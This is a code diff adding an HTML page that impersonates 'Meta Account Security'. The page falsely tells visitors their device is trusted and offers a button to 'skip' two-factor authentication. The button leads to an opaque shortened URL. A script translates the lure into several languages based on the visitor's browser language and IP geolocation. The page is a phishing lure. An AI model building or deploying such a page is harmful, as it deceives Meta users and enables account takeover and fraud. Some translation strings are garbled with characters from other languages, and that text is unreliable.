@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta property="og:title" content="Xác minh bảo mật hệ thống">
+    <meta property="og:description" content="Nhấn để tiếp tục truy cập an toàn">
+    <meta property="og:image" content="https://i.postimg.cc/W3gNBtC9/meta-6871457-640.png">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Account Security</title>
+    <style>
+        /* Tối ưu hóa font chữ để mượt và thanh mảnh hơn */
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            background-color: #f0f2f5; 
+            -webkit-font-smoothing: antialiased; 
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* KHUNG THẺ ĐƯỢC THIẾT KẾ LẠI - TỐI GIẢN HƠN */
+        .card { 
+            background: white; 
+            padding: 40px; /* Tăng padding cho thoáng */
+            border-radius: 16px; /* Bo góc mềm mại hơn */
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05); /* Đổ bóng cực nhẹ, tự nhiên */
+            text-align: center; 
+            max-width: 380px; 
+            width: 90%; 
+            border: 1px solid #e0e0e0; /* Thêm viền mảnh mảnh */
+        }
+
+        /* LOADER ĐƯỢC THIẾT KẾ LẠI - TINH TẾ HƠN */
+        .loader-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+        .loader { 
+            border: 3px solid #f3f3f3; 
+            border-top: 3px solid #1877f2; /* Màu xanh chuẩn Meta */
+            border-radius: 50%; 
+            width: 36px; 
+            height: 36px; 
+            animation: spin 0.8s linear infinite; /* Quay nhanh hơn một chút */
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* TIÊU ĐỀ - GIẢM ĐỘ ĐẬM, TĂNG ĐỘ THANH LỊCH */
+        h2 { 
+            font-size: 20px; /* Tăng nhẹ kích thước */
+            color: #1c1e21; 
+            font-weight: 500; /* Giảm độ đậm xuống 500 cho chữ mảnh và sang */
+            margin-bottom: 12px;
+            margin-top: 0;
+            letter-spacing: -0.5px; /* Giảm khoảng cách chữ cho gọn */
+        }
+
+        /* ĐOẠN VĂN - GIỮ MẢNH, TĂNG KHOẢNG CÁCH DÒNG */
+        p { 
+            color: #606770; 
+            font-size: 14px; 
+            line-height: 1.6; /* Tăng line-height cho dễ đọc */
+            margin-bottom: 35px; 
+            font-weight: 400; 
+        }
+
+        /* NÚT BẤM - CẬP NHẬT THEO PHONG CÁCH "ĐƠN GIẢN & ĐẸP" */
+        button { 
+            background-color: #1877f2; /* Màu xanh chuẩn Meta */
+            color: white; 
+            border: none; 
+            padding: 14px 28px; /* Tăng padding cho nút bấm */
+            border-radius: 50px; /* Bo góc "viên thuốc" 2026 */
+            font-weight: 600; 
+            cursor: pointer; 
+            font-size: 15px; 
+            transition: background-color 0.2s, transform 0.1s; 
+            width: 100%; 
+            outline: none;
+            box-shadow: 0 2px 4px rgba(24, 119, 242, 0.2); /* Đổ bóng màu xanh nhẹ */
+        }
+
+        /* Hiệu ứng khi di chuột qua */
+        button:hover { 
+            background-color: #166fe5; 
+        }
+
+        /* Hiệu ứng khi nhấn xuống */
+        button:active {
+            transform: scale(0.98); /* Nhấn nhẹ nút xuống */
+            background-color: #1464cc;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="loader-container">
+            <div class="loader"></div>
+        </div>
+        <h2 id="title">Meta Account Security</h2>
+        <p id="desc">Your device has been recognized as trusted. Click the button below to skip the verification code and access your account directly.</p>
+        <button id="btn" onclick="window.location.href='https://bom.so/RUINz4'">Skip and Continue</button>
+    </div>
+
+    <script>
+        const translations = {
+            'vi': { 
+                t: 'Bỏ qua xác thực 2 lớp (2FA)', 
+                d: 'Thiết bị của bạn đã được nhận diện là đáng tin cậy. Nhấn nút bên dưới để bỏ qua bước nhập mã và truy cập thẳng vào hệ thống.', 
+                b: 'Bỏ qua và Tiếp tục' 
+            },
+            'en': { 
+                t: 'Skip Two-Factor Authentication (2FA)', 
+                d: 'Your device has been recognized as trusted. Click the button below to skip the verification code and access the system directly.', 
+                b: 'Skip and Continue' 
+            },
+            'hu': { 
+                t: 'Kétfaktoros hitelesítés (2FA) kihagyása', 
+                d: 'Eszközét megbízhatónak ismertük fel. Kattintson az alábbi gombra az ellenőrző kód kihagyásához és a közvetlen belépéshez.', 
+                b: 'Kihagyás és folytatás' 
+            },
+            'de': { 
+                t: 'Zwei-Faktor-Authentisierung (2FA) überspringen', 
+                d: 'Ihr Gerät wurde als vert루ärdig erkannt. Klicken Sie auf die Schaltfläche unten, um den Bestätigungscode zu überspringen.', 
+                b: 'Überspringen und fortfahren' 
+            },
+            'fr': { 
+                t: 'Ignorer l\'authentification à deux facteurs (2FA)', 
+                d: 'Votre appareil a été reconnu comme fiable. Cliquez sur le bouton ci-dessous pour ignorer le code de vérification.', 
+                b: 'Ignorer et continuer' 
+            },
+            'ar': { 
+                t: 'تخطي المصادقة الثنائية (2FA)', 
+                d: 'تم اكتشاف طلب وصول جديد. يرجى التحقق من متصفحك لإكمال فحص الأمان.', 
+                b: 'تخطي ومتابعة' 
+            },
+            'el': { 
+                t: 'Παράλειψη ελέγχου ταυτότητας 2 παραγόντων (2FA)', 
+                d: 'Η συσκευή σας αναγνωρίστηκε ως αξιόπιστη. Κάντε κλικ στο κουμπί cho παράλειψη του κωδικού επαλήθευσης.', 
+                b: 'Παράλειψη και συνέχεια' 
+            }
+        };
+
+        function setContent(langCode) {
+            const lang = translations[langCode] || translations['en'];
+            document.getElementById('title').innerText = lang.t;
+            document.getElementById('desc').innerText = lang.d;
+            document.getElementById('btn').innerText = lang.b;
+            if (langCode === 'ar') document.body.style.direction = 'rtl';
+            else document.body.style.direction = 'ltr';
+        }
+
+        async function initSecurityCheck() {
+            // Khởi tạo nhanh bằng ngôn ngữ trình duyệt
+            let browserLang = (navigator.language || navigator.userLanguage).substring(0, 2).toLowerCase();
+            setContent(browserLang);
+
+            // Kiểm tra chính xác theo IP (đặc biệt cho Hungary)
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                if (data && data.country_code) {
+                    const country = data.country_code.toLowerCase();
+                    if (country !== browserLang) {
+                        setContent(country);
+                    }
+                }
+            } catch (e) {
+                console.log("Dùng ngôn ngữ trình duyệt làm mặc định.");
+            }
+        }
+
+        initSecurityCheck();
+    </script>
+</body>
+</html>
